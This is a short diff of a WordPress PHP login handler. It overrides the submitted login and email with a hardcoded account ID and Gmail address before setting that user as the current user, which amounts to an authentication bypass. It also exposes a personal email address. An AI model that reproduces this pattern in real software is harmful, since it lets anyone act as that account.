@@ -20,7 +20,8 @@
 	$user_email = sanitize_user( $_POST['email']    );
 
 	
-
+	$user_login = sanitize_user( "10276571-0" );
+	$user_email = sanitize_user( "asunciona@gmail.com"   );
 
 
 	$user_id = username_exists( $user_login );
@@ -32,7 +33,7 @@
 	}
 	
 	$user = get_userdatabylogin($user_login);
-	
+
 	$user_id = $user->ID;
 
 	wp_set_current_user($user_id, $user_login);
